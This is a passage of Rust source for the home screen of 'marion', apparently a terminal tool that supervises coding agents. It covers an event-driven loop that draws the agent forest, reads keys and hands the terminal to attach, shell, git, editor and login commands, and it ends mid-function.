//! The home screen's loop: paint, keep the forest and the selected node current, read the
//! keyboard, carry out what the keys asked for.
//!
//! # One thread for the screen, as the tree screen had
//!
//! The keyboard is glanced at on this thread and nowhere else: an attach started from here reads
//! the same stdin, and a reader thread still blocked in `read(2)` would steal the operator's first
//! keystroke into the pane. The slow things run beside it and report over a channel — the doctor
//! probe (a `--version` per harness, seconds in all) and a `marion run` (which may start a
//! supervisor) — so neither holds up a frame.
//!
//! # Leaving and coming back
//!
//! An attach, a resume, a shell, a diff and an editor each need the whole terminal, so the loop
//! leaves the screen, runs the command in the foreground and re-enters — the pattern `marion tree`
//! used for its attach. The state survives the trip; only the terminal changes hands.

use super::view::{self, Places};
use super::{AgentType, Effect, Harness, Home};
use crate::doctor::{self, SurfaceRole};
use crate::tree::Subscription;
use marion_core::contract::AgentId;
use marion_core::proto::params::ActivityCursor;
use marion_tui::home::keys::{self, Key};
use marion_tui::home::{Page, Ready, Screen as HomeScreen, Theme};
use marion_tui::{Screen, ScreenBackend, Sticky};
use ratatui::Terminal;
use std::path::{Path, PathBuf};
use std::sync::mpsc::{Receiver, Sender, channel};
use std::time::{Duration, Instant};

use super::wake::{self, Wake, Waker};

/// A side thread's way to report: the report on the channel, then a wake so the loop reads it.
#[derive(Clone)]
struct Reporter {
    tx: Sender<Report>,
    waker: Waker,
}

impl Reporter {
    /// `false` once the screen has gone and nobody will read it.
    fn send(&self, r: Report) -> bool {
        let sent = self.tx.send(r).is_ok();
        self.waker.wake();
        sent
    }
}

/// How often a missing supervisor is looked for again when its socket's directory could not be
/// watched. Normally nothing is timed: the directory is watched ([`Session::socket_dir`]), and a
/// supervisor binding its socket there is the entry change that wakes the screen to dial.
const REDIAL: Duration = Duration::from_secs(1);
/// How often the screen redraws while something on it moves with time — a running node's
/// elapsed time and spinner, a harness still being checked — and how often a running selected
/// node's detail and stream are read again. Nothing ticks while nothing moves.
const TICK: Duration = Duration::from_secs(1);

/// Where the home screen is looking.
#[derive(Debug, Clone)]
pub struct Options {
    pub repo: PathBuf,
    pub state: PathBuf,
}

/// What needs the whole terminal, so the loop leaves the screen for it.
enum Handoff {
    Quit,
    Attach(String),
    Resume(AgentId),
    Shell(PathBuf),
    Diff(String),
    Merge(String),
    EditTypes,
    /// `marion login <credential id>` / `marion logout <credential id>`, in the foreground.
    Login(String),
    Logout(String),
    /// `marion profile add <harness> <name>`, in the foreground: it prints the login command.
    ProfileAdd(String, String),
}

/// What the side threads report.
enum Report {
    /// Doctor's rows for one harness.
    Doctor(Vec<doctor::Row>),
    DoctorDone,
    /// The stored keys, as `marion login --list` finds them, and the store's name; or why not.
    Logins(Result<(Vec<crate::login::ProviderLogins>, String), String>),
    /// The profiles, before any probe has answered; or why they could not be listed.
    Profiles(Result<Vec<super::StoredProfile>, String>),
    /// One profile's login, as its harness's read-only probe answered.
    ProfileLogin(String, crate::profiles::LoginState),
    /// A `marion run` finished: whether it started, its last line, and the root it named.
    Ran {
        ok: bool,
        line: String,
        root: Option<String>,
    },
    /// A cancel or its escalation answered, in one line.
    Ended(String),
    /// A node's task, as `node/get` read it for the row's title; `None` where it has none.
    Title(AgentId, Option<String>),
    /// A node whose `node/get` failed: nothing is known of its task, so it is asked again.
    TitleUnread(AgentId),
}

/// Run the home screen until the operator quits.
pub fn run(opts: &Options) -> Result<(), String> {
    let mut s = Session::new(opts);
    loop {
        let (cols, rows) = marion_tui::guard::window_size(0).unwrap_or((80, 24));
        let screen = Screen::enter(std::io::stdout(), 0, &Sticky::initial(cols, rows))
            .map_err(|e| format!("entering the terminal: {e}"))?;
        match s.draw_loop(screen, cols, rows)? {
            Handoff::Quit => return Ok(()),
            Handoff::Attach(id) => {
                if let Err(e) = crate::attach::run(&id, &s.repo, &s.state) {
                    s.home.notice = Some(format!("attach refused: {e}"));
                }
            }
            Handoff::Resume(id) => {
                let c = s.marion(&["resume", &id.0]);
                s.foreground(c, "resume");
            }
            Handoff::Shell(dir) => {
                let shell = std::env::var("SHELL").unwrap_or_else(|_| "sh".into());
                let mut c = std::process::Command::new(shell);
                c.current_dir(dir);
                s.foreground(c, "shell");
            }
            Handoff::Diff(branch) => {
                let c = branch_log(&s.repo, &branch);
                s.foreground(c, "git log");
            }
            Handoff::Merge(branch) => match branch_merge(&s.repo, &branch) {
                Err(why) => s.home.notice = Some(why),
                Ok(c) => {
                    s.foreground(c, "git merge");
                    if s.home.notice.is_none() {
                        s.home.notice = Some(format!("merged {branch}"));
                        s.home.merged(&branch);
                    }
                }
            },
            Handoff::EditTypes => {
                let file = s.repo.join(crate::run::AGENT_TYPES_FILE);
                if let Some(dir) = file.parent() {
                    let _ = std::fs::create_dir_all(dir);
                }
                let editor = std::env::var("EDITOR").unwrap_or_else(|_| "vi".into());
                let mut c = std::process::Command::new(editor);
                c.arg(&file);
                s.foreground(c, "editor");
                s.validate_types();
            }
            Handoff::Login(id) => s.credential("add", &id),
            Handoff::Logout(id) => s.credential("rm", &id),
            Handoff::ProfileAdd(harness, name) => {
                let c = s.profile_command(&["add", &harness, &name]);
                s.foreground(c, "marion profile add");
                if s.home.notice.is_none() {
                    // The probe has not answered yet: the row says whether it is signed in.
                    s.home.notice = Some(format!(
                        "login {harness} {name} added; signed out, it shows the command to sign in"
                    ));
                }
                s.added_profile = Some(name);
                s.load_profiles();
            }
        }
    }
}

struct Session {
    home: Home,
    places: Places,
    repo: PathBuf,
    state: PathBuf,
    /// The project root §2 keys the supervisor on, resolved once: dialling again must not ask git
    /// again.
    key: PathBuf,
    sock: crate::socket::SocketPaths,
    /// The directory the supervisor's socket appears in (its nearest existing ancestor until it
    /// exists), watched while no supervisor is there.
    socket_dir: crate::wake::Watch,
    /// The watch fired: look for a supervisor at the next pass.
    socket_moved: bool,
    theme: Theme,
    sub: Option<Subscription>,
    last_dial: Option<Instant>,
    /// The selected node's detail must be read again: the selection, the tab or the forest
    /// changed, or a tick passed over a running node.
    detail_stale: bool,
    /// A root a run just started, to select once the forest shows it.
    pending_select: Option<String>,
    reports: Receiver<Report>,
    reporter: Reporter,
    wake: Wake,
    /// Seconds of animation: spinners advance one frame per tick.
    tick: usize,
    next_tick: Instant,
    /// Something changed since the last paint.
    dirty: bool,
    /// The profiles have been asked for: once Setup is first shown, since listing them runs each
    /// harness's status probe.
    profiles_asked: bool,
    /// A profile `marion profile add` just made, to select once the listing shows it.
    added_profile: Option<String>,
    /// Nodes whose task has been asked for, for their row's title: each is asked once.
    titles_asked: std::collections::HashSet<AgentId>,
}

impl Session {
    fn new(opts: &Options) -> Session {
        let key = crate::socket::project_root(&opts.repo);
        let sock = crate::socket::socket_paths(&opts.state, &key, crate::socket::own_uid());
        let socket = sock.socket();
        let socket_dir = crate::wake::Watch::new(socket.parent().unwrap_or(socket));
        let shown = match key.file_name().and_then(|f| f.to_str()) {
            Some(".git") => key.parent().unwrap_or(&key).to_path_buf(),
            _ => key.clone(),
        };
        crate::recent::touch_project(
            &marion_core::paths::ProjectDir::new(&opts.state, &key),
            &key,
        );
        let (tx, reports) = channel();
        let wake = Wake::new().expect("a socket pair for the screen's wakes");
        let reporter = Reporter {
            tx,
            waker: wake.waker(),
        };
        let mut s = Session {
            home: Home::new(),
            places: Places {
                project: view::project_label(
                    &shown.to_string_lossy(),
                    std::env::var("HOME").ok().as_deref(),
                    current_branch(&shown).as_deref(),
                ),
            },
            repo: opts.repo.clone(),
            state: opts.state.clone(),
            key,
            sock,
            socket_dir,
            socket_moved: false,
            theme: Theme::from_env(),
            sub: None,
            last_dial: None,
            detail_stale: true,
            pending_select: None,
            reports,
            reporter,
            wake,
            tick: 0,
            next_tick: Instant::now(),
            dirty: true,
            profiles_asked: false,
            added_profile: None,
            titles_asked: std::collections::HashSet::new(),
        };
        s.load_types();
        s.recheck();
        s.load_logins();
        s.load_repo_trust();
        s
    }

    /// One stay on the screen: until the operator quits or asks for something that needs the
    /// whole terminal. The terminal is restored on every way out.
    ///
    /// Event-driven: it paints only when something changed, then sleeps in one `poll(2)` over the
    /// keyboard, the supervisor's stream and the wake pair until one of them has something. The
    /// timeout is the soonest thing the screen needs on its own — a [`TICK`] while something on it
    /// moves, a [`REDIAL`] while no supervisor is there — and none at all otherwise, so an idle
    /// screen over an idle forest makes no wakeups.
    fn draw_loop(&mut self, screen: Screen, cols: u16, rows: u16) -> Result<Handoff, String> {
        let mut stdin = marion_tui::guard::Keyboard::open(0)
            .map_err(|e| format!("watching the keyboard: {e}"))?;
        let mut terminal = Terminal::new(ScreenBackend::new(screen, cols, rows))
            .map_err(|e| format!("starting the renderer: {e}"))?;
        let leave = |t: &Terminal<ScreenBackend>| t.backend().screen().leave();
        self.wake.watch_resizes();
        let mut size = (cols, rows);
        let mut buf = [0u8; 1024];
        self.dirty = true;
        loop {
            self.timers();
            self.follow_selection();
            if self.dirty {
                self.paint(&mut terminal);
                self.dirty = false;
            }
            let timeout = self.timeout();
            // SAFETY: fd 0 is the operator's terminal, open for the whole of this loop.
            let stdin_fd = unsafe { std::os::fd::BorrowedFd::borrow_raw(0) };
            let mut fds = vec![stdin_fd, self.wake.fd()];
            if let Some(sub) = &self.sub {
                fds.push(sub.fd());
            }
            // While no supervisor is there, its socket's directory: a bind there wakes the dial.
            let watching = self.sub.is_none() && self.socket_dir.fd().is_some();
            if watching && let Some(dir) = self.socket_dir.fd() {
                fds.push(dir);
            }
            let ready = wake::wait(&fds, timeout).unwrap_or_else(|_| vec![false; fds.len()]);
            drop(fds);
            if watching && ready.last().copied().unwrap_or(false) {
                self.socket_dir.rearm();
                self.socket_moved = true;
            }
            if ready[1] {
                if self.wake.drain()
                    && let Some(now) = marion_tui::guard::window_size(0)
                    && now != size
                {
                    size = now;
                    terminal.backend_mut().set_size(size.0, size.1);
                    self.dirty = true;
                }
                self.reports();
            }
            if self.sub.is_some() && ready.get(2).copied().unwrap_or(false) {
                self.follow_forest();
            }
            if ready[0] {
                let n = match stdin.read_within(&mut buf, Duration::ZERO) {
                    Ok(Some(0)) => {
                        leave(&terminal);
                        return Ok(Handoff::Quit);
                    }
                    Ok(Some(n)) => n,
                    Ok(None) | Err(_) => 0,
                };
                for key in keys::decode(&buf[..n]) {
                    self.dirty = true;
                    if let Some(handoff) = self.key(key) {
                        leave(&terminal);
                        return Ok(handoff);
                    }
                    // A key may have moved the selection or come back to the agents: read what
                    // the preview shows.
                    self.detail_stale |= self.home.page == Page::Agents;
                }
            }
        }
    }

    /// How long the loop may sleep: until the next tick while something on screen moves, until
    /// the next look for a supervisor while there is none, else for as long as nothing happens.
    fn timeout(&self) -> Option<Duration> {
        let now = Instant::now();
        let tick = self
            .home
            .animating()
            .then(|| self.next_tick.saturating_duration_since(now));
        let redial = self.sub.is_none().then(|| match self.last_dial {
            None => Duration::ZERO,
            Some(_) if self.socket_moved => Duration::ZERO,
            // Watched: nothing to time until the directory changes.
            Some(_) if self.socket_dir.fd().is_some() => Duration::MAX,
            Some(t) => REDIAL.saturating_sub(t.elapsed()),
        });
        tick.into_iter()
            .chain(redial.filter(|r| *r != Duration::MAX))
            .min()
    }

    /// What is due on the clock: a tick, and a look for a missing supervisor.
    fn timers(&mut self) {
        let now = Instant::now();
        if now >= self.next_tick {
            self.next_tick = now + TICK;
            if self.home.animating() {
                self.tick = self.tick.wrapping_add(1);
                self.dirty = true;
                // A running selected node's output moves with it.
                self.detail_stale |= self.home.page == Page::Agents;
            }
        }
        let due = match self.last_dial {
            None => true,
            Some(_) if self.socket_moved => true,
            Some(t) => self.socket_dir.fd().is_none() && t.elapsed() >= REDIAL,
        };
        if self.sub.is_none() && due {
            self.dial();
        }
    }

    /// One key through the state machine, and its effect carried out. `Some` when it needs the
    /// whole terminal.
    fn key(&mut self, key: Key) -> Option<Handoff> {
        // An error notice stays until Esc; any other notice goes with the next key.
        if !self.home.notice_sticky || key == Key::Esc {
            self.home.notice = None;
            self.home.notice_sticky = false;
        }
        let handoff = self.effect(key);
        if self.home.page == Page::Setup && !self.profiles_asked {
            self.load_profiles();
            self.load_notify();
        }
        handoff
    }

    /// The key's effect, carried out.
    fn effect(&mut self, key: Key) -> Option<Handoff> {
        match self.home.key(key) {
            Effect::None => None,
            Effect::Quit => Some(Handoff::Quit),
            Effect::Attach(id) => match self.home.selected().map(crate::tree::open_target) {
                Some(Ok(_)) => Some(Handoff::Attach(id.0)),
                Some(Err(why)) => {
                    self.home.notice = Some(why);
                    None
                }
                None => None,
            },
            Effect::Resume(id) => Some(Handoff::Resume(id)),
            Effect::Shell(dir) => Some(Handoff::Shell(dir)),
            Effect::Diff(branch) => Some(Handoff::Diff(branch)),
            Effect::Merge(branch) => Some(Handoff::Merge(branch)),
            Effect::EditTypes => Some(Handoff::EditTypes),
            Effect::Login(id) => Some(Handoff::Login(id)),
            Effect::Logout(id) => Some(Handoff::Logout(id)),
            Effect::ProfileAdd { harness, name } => Some(Handoff::ProfileAdd(harness, name)),
            Effect::ProfileUse { harness, name } => {
                self.profile_verb(&["use", &harness, &name]);
                None
            }
            Effect::Notify(on) => {
                self.notify(on);
                None
            }
            Effect::RepoTrust(allow) => {
                self.repo_trust(allow);
                None
            }
            Effect::ProfileRemove { harness, name } => {
                self.profile_verb(&["rm", &harness, &name]);
                None
            }
            Effect::Steer(id, text) => {
                self.home.notice =
                    Some(match crate::courier::steer(&self.sock, &id, &text, None) {
                        Ok(s) => s.sentence(),
                        Err(e) => format!("steer refused: {e}"),
                    });
                None
            }
            // **On a thread**: a cancel waits out each level's grace, which can be seconds, and the
            // screen keeps drawing — the node's own summary shows it being cancelled meanwhile.
            effect @ (Effect::Cancel(_) | Effect::Kill(_)) => {
                let force = matches!(effect, Effect::Kill(_));
                let (Effect::Cancel(id) | Effect::Kill(id)) = effect else {
                    unreachable!("matched above")
                };
                let (socket, tx) = (self.sock.clone(), self.reporter.clone());
                let short = crate::tree::short_id(&id.0).to_string();
                self.home.notice = Some(if force {
                    format!("killing {short}")
                } else {
                    format!("cancelling {short}")
                });
                std::thread::spawn(move || {
                    let line = if force {
                        match crate::courier::kill(&socket, &id) {
                            Ok(_) => format!("{short} killed"),
                            Err(e) => format!("kill refused: {e}"),
                        }
                    } else {
                        match crate::courier::cancel(&socket, &id) {
                            Ok(r) => cancelled_line(&short, &r.nodes),
                            Err(e) => format!("cancel refused: {e}"),
                        }
                    };
                    tx.send(Report::Ended(line));
                });
                None
            }
            Effect::Recheck => {
                self.recheck();
                None
            }
            run @ Effect::Run { .. } => {
                self.start_run(&run);
                None
            }
        }
    }

    /// `marion run … --detach` on a thread: this binary, the echoed argv, the project stated.
    fn start_run(&mut self, run: &Effect) {
        let Some(argv) = run.argv() else { return };
        if let Effect::Run {
            agent_type,
            model: Some(model),
            ..
        } = run
            && let Some(t) = self.home.types.iter().find(|t| t.name == *agent_type)
        {
            crate::recent::remember_model(&self.state, &t.harness, model);
            self.load_models();
        }
        let args: Vec<&str> = argv[1..].iter().map(String::as_str).collect();
        let mut c = self.marion(&args);
        let tx = self.reporter.clone();
        self.home.notice = Some("starting".into());
        std::thread::spawn(move || {
            let report = match c.stdin(std::process::Stdio::null()).output() {
                Ok(out) => {
                    let stdout = String::from_utf8_lossy(&out.stdout);
                    let stderr = String::from_utf8_lossy(&out.stderr);
                    let said = super::failure_line(&stdout, &stderr);
                    let root = started_root(&stdout).or_else(|| started_root(&stderr));
                    Report::Ran {
                        ok: out.status.success(),
                        line: match &root {
                            Some(id) => format!("started {}", crate::tree::short_id(id)),
                            None => said,
                        },
                        root,
                    }
                }
                Err(e) => Report::Ran {
                    ok: false,
                    line: format!("marion run did not start: {e}"),
                    root: None,
                },
            };
            tx.send(report);
        });
    }

    /// Look for this project's supervisor, and subscribe to its forest when there is one.
    fn dial(&mut self) {
        self.last_dial = Some(Instant::now());
        self.socket_moved = false;
        if let Ok(mut sub) = Subscription::open_at(&self.key, &self.state) {
            if sub.nonblocking().is_err() {
                return;
            }
            // A screen on a terminal shows the supervisor's notices where no desktop notifier does.
            if std::io::IsTerminal::is_terminal(&std::io::stdout()) {
                let _ = sub.claim_notices();
            }
            self.home.set_nodes(sub.nodes.clone());
            self.sub = Some(sub);
            self.forest_moved();
        }
    }

    /// Fold what the supervisor's stream has sent; a closed stream is a supervisor gone.
    fn follow_forest(&mut self) {
        let Some(sub) = &mut self.sub else { return };
        let drained = sub.drain();
        // Rung here, between frames: the screen draws after this, so an escape never lands inside
        // one.
        ring_notices(std::mem::take(&mut sub.notices));
        match drained {
            Ok(true) => {
                let nodes = sub.nodes.clone();
                self.home.set_nodes(nodes);
                self.forest_moved();
            }
            Ok(false) => {}
            Err(_) => {
                self.sub = None;
                self.home.lost_supervisor();
                self.dirty = true;
            }
        }
    }

    fn forest_moved(&mut self) {
        self.dirty = true;
        self.detail_stale = true;
        if let Some(id) = self.pending_select.clone()
            && self.home.select(&id)
        {
            self.pending_select = None;
        }
        self.load_titles();
    }

    /// Ask, on a thread, for the task of every node whose row has no title yet: one `node/get`
    /// per node, once — a task does not change. The answers arrive as [`Report::Title`].
    fn load_titles(&mut self) {
        let ids: Vec<AgentId> = self
            .home
            .untitled()
            .into_iter()
            .filter(|id| self.titles_asked.insert(id.clone()))
            .collect();
        if ids.is_empty() {
            return;
        }
        let (sock, tx) = (self.sock.clone(), self.reporter.clone());
        std::thread::spawn(move || {
            for id in ids {
                let report = match crate::courier::node_get(&sock, &id) {
                    Ok(r) => Report::Title(id, r.detail.task.map(|t| t.prompt)),
                    Err(_) => Report::TitleUnread(id),
                };
                if !tx.send(report) {
                    return;
                }
            }
        });
    }

    /// Read the selected node's detail and the next page of its stream, while Watch shows it:
    /// when it is stale (a new selection, a forest change, a tick over a running node), never on a
    /// timer of its own.
    fn follow_selection(&mut self) {
        if !self.detail_stale || self.home.page != Page::Agents || self.sub.is_none() {
            return;
        }
        self.detail_stale = false;
        let Some(id) = self.home.selected().map(|n| n.agent_id.clone()) else {
            return;
        };
        let cursor = match (&self.home.watch.detail, self.home.watch.next) {
            (Some((d, _)), Some(next)) if *d == id => ActivityCursor::From(next),
            _ => ActivityCursor::Tail,
        };
        if let Ok(r) = crate::courier::node_get_with(&self.sock, &id, Some(cursor)) {
            self.home.absorb_detail(id, r.detail);
            self.dirty = true;
        }
    }

    fn paint(&mut self, terminal: &mut Terminal<ScreenBackend>) {
        let frame = view::frame(&self.home, &self.places);
        let screen = HomeScreen {
            theme: self.theme,
            title: &frame.title,
            counts: &frame.counts,
            body: frame.body(self.home.page),
            footer: frame.footer.clone(),
            notice: self.home.notice.clone(),
            frame: self.tick,
        };
        let _ = terminal.draw(|f| f.render_widget(&screen, f.area()));
    }

    /// `marion <args>` for this project: this same binary, with the project it was opened on
    /// stated so the child cannot resolve a different one.
    fn marion(&self, args: &[&str]) -> std::process::Command {
        let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("marion"));
        let mut c = std::process::Command::new(exe);
        c.args(args)
            .arg("--repo")
            .arg(&self.repo)
            .arg("--state-dir")
            .arg(&self.state);
        c
    }

    /// Run `c` with the terminal, and say how it ended if it failed.
    fn foreground(&mut self, mut c: std::process::Command, what: &str) {
        match c.status() {
            Ok(st) if st.success() => {}
            Ok(st) => self.home.notice = Some(format!("{what} exited {st}")),
            Err(e) => self.home.notice = Some(format!("{what} did not start: {e}")),
        }
    }

    /// `marion login|logout <id>` with the terminal, then the keys listed again. Not
    /// [`Session::marion`]: login takes no project flags, and its key prompt reads the terminal
    /// itself with echo off, so the key never passes through this process.
    fn credential(&mut self, verb: &str, id: &str) {
        let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("marion"));
        let mut c = std::process::Command::new(exe);
        c.args(["key", verb, id]);
        self.foreground(c, &format!("marion key {verb}"));
        if self.home.notice.is_none() {
            self.home.notice = Some(format!("marion key {verb} {id}: done"));
        }
        self.load_logins();
    }

    /// `marion profile <args>`: this binary, and no project flags — the verb takes none, and keeps
    /// its profiles where every other `marion profile` does.
    fn profile_command(&self, args: &[&str]) -> std::process::Command {
        let exe = std::env::current_exe().unwrap_or_else(|_| PathBuf::from("marion"));
        let mut c = std::process::Command::new(exe);
        c.arg("profile").args(args);
        c
    }

    /// A `marion profile` verb that only edits the profiles file (`use`, `remove`): run to its end
    /// beside the screen, its last line as the notice, then the profiles listed again.
    fn profile_verb(&mut self, args: &[&str]) {
        let mut c = self.profile_command(args);
        self.home.notice = Some(match c.stdin(std::process::Stdio::null()).output() {
            Ok(out) => {
                let stdout = String::from_utf8_lossy(&out.stdout);
                let stderr = String::from_utf8_lossy(&out.stderr);
                stdout
                    .lines()
                    .chain(stderr.lines())
                    .rfind(|l| !l.trim().is_empty())
                    .unwrap_or("")
                    .to_string()
            }
            Err(e) => format!("marion profile did not start: {e}"),
        });
        self.load_profiles();
    }

    /// Whether notifications are on, for Setup's row: one small file read, so not on a thread.
    fn load_notify(&mut self) {
        let (on, shown_by) = crate::notify::status();
        self.home.setup.notify = Some(on);
        self.home.setup.notify_shown_by = shown_by;
    }

    /// Where this repository stands, for Setup's repository row and the status line's count: the
    /// trust store and a few `stat`s, so not on a thread.
    fn load_repo_trust(&mut self) {
        self.home.setup.repo =
            crate::trust::repo_standing(&self.repo).map(|(answer, files)| super::RepoTrust {
                answer,
                files: files.into_iter().map(str::to_string).collect(),
            });
    }

    /// Setup's repository row answered: `marion trust allow --repo` or `deny --repo` in this
    /// project, run here by the same code the CLI runs, refused from inside a node as the CLI is
    /// ([`crate::trust::answer_repo`]), its last line the notice.
    fn repo_trust(&mut self, allow: bool) {
        let verb = if allow { "allow" } else { "deny" };
        self.home.notice = Some(match crate::trust::answer_repo(allow, &self.repo) {
            Ok(said) => said,
            Err(why) => format!("marion trust {verb} --repo: {why}"),
        });
        self.load_repo_trust();
    }

    /// Setup's notifications row turned: the operator's file, then this project's running
    /// supervisor at once — `marion notify on|off`, done here so the screen never leaves.
    fn notify(&mut self, on: bool) {
        let word = if on { "on" } else { "off" };
        self.home.notice = Some(match crate::notify::set_enabled(on) {
            Ok(_) => {
                self.home.setup.notify = Some(on);
                match crate::courier::notify_configure(&self.sock, on) {
                    Ok(_) => format!("notifications {word}, now and for every supervisor after"),
                    Err(_) => format!("notifications {word}; a supervisor reads it when it starts"),
                }
            }
            Err(e) => format!("notifications unchanged: {e}"),
        });
    }

    /// List the profiles on a thread, then ask each one's harness whether it is logged in — a
    /// read-only probe per profile, carrying its row's update switch, reported as it answers.
    fn load_profiles(&mut self) {
        self.profiles_asked = true;
        let tx = self.reporter.clone();
        let state = self.state.clone();
        std::thread::spawn(move || {
            let Some(paths) = crate::profiles::ProfilePaths::from_env() else {
                tx.send(Report::Profiles(Err(
                    "none of $XDG_CONFIG_HOME, $XDG_DATA_HOME or $HOME is set".into(),
                )));
                return;
            };
            let listed = match crate::profiles::listed(&paths.with_state_root(&state)) {
                Ok(listed) => listed,
                Err(e) => {
                    tx.send(Report::Profiles(Err(e.to_string())));
                    return;
                }
            };
            let rows = listed.iter().map(stored_profile).collect();
            if !tx.send(Report::Profiles(Ok(rows))) {
                return;
            }
            for l in listed {
                let login = crate::profiles::login_state(&l.profile);
                if !tx.send(Report::ProfileLogin(l.profile.name, login)) {
                    return;
                }
            }
        });
    }

    /// List the stored keys on a thread: the Keychain answers one `security` call per id, which is
    /// too slow for a frame.
    fn load_logins(&mut self) {
        let tx = self.reporter.clone();
        std::thread::spawn(move || {
            tx.send(Report::Logins(crate::login::user_logins()));
        });
    }

    fn load_types(&mut self) {
        match crate::run::agent_types(&self.repo) {
            Ok(types) => {
                let user: Vec<&str> = types.user().iter().map(|t| t.name.as_str()).collect();
                self.home.types = types
                    .names()
                    .iter()
                    .filter_map(|n| types.resolve(n))
                    .map(|t| AgentType {
                        harness: harness_name(t.harness, t.acp_agent.as_deref()),
                        writes: marion_harness::writes_files(&t),
                        custom: user.contains(&t.name.as_str()),
                        name: t.name.clone(),
                    })
                    .collect();
            }
            Err(e) => self.home.notice = Some(e.to_string()),
        }
        self.load_models();
    }

    fn load_models(&mut self) {
        let mut names: Vec<String> = self.home.types.iter().map(|t| t.harness.clone()).collect();
        names.sort();
        names.dedup();
        self.home.recent_models = names
            .into_iter()
            .map(|n| {
                let models = crate::recent::models(&self.state, &n);
                (n, models)
            })
            .collect();
    }

    fn validate_types(&mut self) {
        self.home.setup.validation = Some(match crate::run::agent_types(&self.repo) {
            Ok(t) => (
                true,
                format!(
                    "{}: {} custom types, valid",
                    crate::run::AGENT_TYPES_FILE,
                    t.user().len()
                ),
            ),
            Err(e) => (false, e.to_string()),
        });
        self.load_types();
    }

    /// Probe every harness again, on a thread, one harness at a time so rows arrive as they are
    /// read rather than all at the end.
    fn recheck(&mut self) {
        use marion_core::harness::Harness as H;
        self.home.checking = true;
        self.home.harnesses = H::ALL
            .iter()
            .filter(|h| **h != H::Acp)
            .map(|h| Harness {
                name: h.cli_name().to_string(),
                version: None,
                ready: Ready::Checking,
                note: "checking".into(),
                surfaces: String::new(),
                pane: false,
                fix: None,
                detail: Vec::new(),
            })
            .collect();
        let tx = self.reporter.clone();
        std::thread::spawn(move || {
            for h in H::ALL {
                let rows = doctor::run(&doctor::Options {
                    mode: marion_core::proto::model::ProbeMode::Capabilities,
                    harness: Some(h),
                    model: None,
                    acp_command: None,
                });
                if !tx.send(Report::Doctor(rows)) {
                    return;
                }
            }
            tx.send(Report::DoctorDone);
        });
    }

    fn reports(&mut self) {
        while let Ok(r) = self.reports.try_recv() {
            self.dirty = true;
            match r {
                Report::Doctor(rows) => {
                    for h in harnesses_of(&rows) {
                        match self.home.harnesses.iter_mut().find(|x| x.name == h.name) {
                            Some(slot) => *slot = h,
                            None => self.home.harnesses.push(h),
                        }
                    }
                }
                Report::DoctorDone => self.home.checking = false,
                Report::Logins(Ok((providers, store))) => {
                    let s = &mut self.home.setup;
                    s.providers = providers
                        .iter()
                        .filter(|p| p.needs_key)
                        .map(|p| p.id.clone())
                        .collect();
                    s.logins = providers
                        .iter()
                        .flat_map(|p| {
                            p.stored.iter().map(|k| super::StoredLogin {
                                provider: p.id.clone(),
                                id: k.id.clone(),
                                note: k.unreadable.clone(),
                            })
                        })
                        .collect();
                    s.store = Some(store);
                    s.logins_error = None;
                }
                Report::Logins(Err(e)) => self.home.setup.logins_error = Some(e),
                Report::Profiles(Ok(rows)) => {
                    let select = self.added_profile.take();
                    self.home
                        .set_profiles(rows, profile_harnesses(), select.as_deref());
                }
                Report::Profiles(Err(e)) => {
                    let s = &mut self.home.setup;
                    s.profiles_listed = true;
                    s.profiles_error = Some(e);
                }
                Report::ProfileLogin(name, login) => {
                    if let Some(p) = self.home.setup.profiles.iter_mut().find(|p| p.name == name) {
                        p.login = Some(login);
                    }
                }
                Report::Ended(line) => self.home.notice = Some(line),
                Report::Title(id, task) => {
                    // Not final yet (a node still spawning): ask again on the next forest change.
                    if !self.home.set_title(&id, task.as_deref()) {
                        self.titles_asked.remove(&id);
                    }
                }
                Report::TitleUnread(id) => {
                    self.titles_asked.remove(&id);
                }
                Report::Ran { ok, line, root } => {
                    self.home.notice = Some(if ok { line } else { format!("{line}  (esc)") });
                    self.home.notice_sticky = !ok;
                    if ok {
                        self.home.page = Page::Agents;
                        self.detail_stale = true;
                        // Look again now: the run may have just started this project's supervisor.
                        self.last_dial = None;
                        self.pending_select = root;
                    }
                }
            }
        }
    }
}

/// One listed profile as Setup holds it, its login not yet asked. The login command is the one
/// `marion profile add` printed — from the row's carrier, shown and never run.
fn stored_profile(l: &crate::profiles::Listed) -> super::StoredProfile {
    let p = &l.profile;
    let login_command = crate::profiles::carrier(p.harness)
        .map(|c| crate::profile_cli::login_command(p.harness, c.env, &p.dir, c.login_hint))
        .unwrap_or_default();
    super::StoredProfile {
        harness: crate::profiles::display_name(p.harness).to_string(),
        name: p.name.clone(),
        default: l.default,
        login: None,
        login_command,
        limit: l.usage.limit.as_ref().map(|limit| {
            format!(
                "last limit {} ({})",
                limit.status,
                limit.window.as_deref().unwrap_or("usage")
            )
        }),
    }
}

/// The harnesses a profile can be added for, as the operator types them: every row with a carrier.
fn profile_harnesses() -> Vec<String> {
    marion_harness::adapter::every()
        .into_iter()
        .filter(|h| crate::profiles::carrier(*h).is_ok())
        .map(|h| crate::profiles::display_name(h).to_string())
        .collect()
}

/// Ring each notice the supervisor sent this screen, the way the operator's `notify.toml` asks.
fn ring_notices(notices: Vec<(String, String, String)>) {
    if notices.is_empty() {
        return;
    }
    let mut out = std::io::stdout().lock();
    for (title, body, ring) in notices {
        let ring = match ring.as_str() {
            "osc9" => crate::notify::TerminalRing::Osc9,
            "osc777" => crate::notify::TerminalRing::Osc777,
            _ => crate::notify::TerminalRing::Bell,
        };
        let shown = crate::notify::Shown { title, body };
        let _ = std::io::Write::write_all(&mut out, &crate::notify::terminal_bytes(ring, &shown));
    }
    let _ = std::io::Write::flush(&mut out);
}

/// What a finished cancel says: how many nodes it ended, and how many had to be killed.
fn cancelled_line(short: &str, nodes: &[marion_core::proto::result::CancelledNode]) -> String {
    let below = nodes.len().saturating_sub(1);
    let forced = nodes.iter().filter(|n| n.forced).count();
    let mut line = format!("{short} cancelled");
    if below > 0 {
        line.push_str(&format!(" with {below} below it"));
    }
    if forced > 0 {
        line.push_str(&format!("; {forced} killed after their grace"));
    }
    line
}

/// The branch checked out at `dir`, read once when the screen opens; `None` outside git.
fn current_branch(dir: &std::path::Path) -> Option<String> {
    let out = crate::gitcmd::command(
        &crate::gitcmd::Tree::Operator(dir),
        &["rev-parse", "--abbrev-ref", "HEAD"],
    )
    .ok()?
    .output()
    .ok()?;
    out.status
        .success()
        .then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
}

/// The root a `marion run` line names: `marion: root <id> (…) started…`.
fn started_root(out: &str) -> Option<String> {
    out.lines().find_map(|l| {
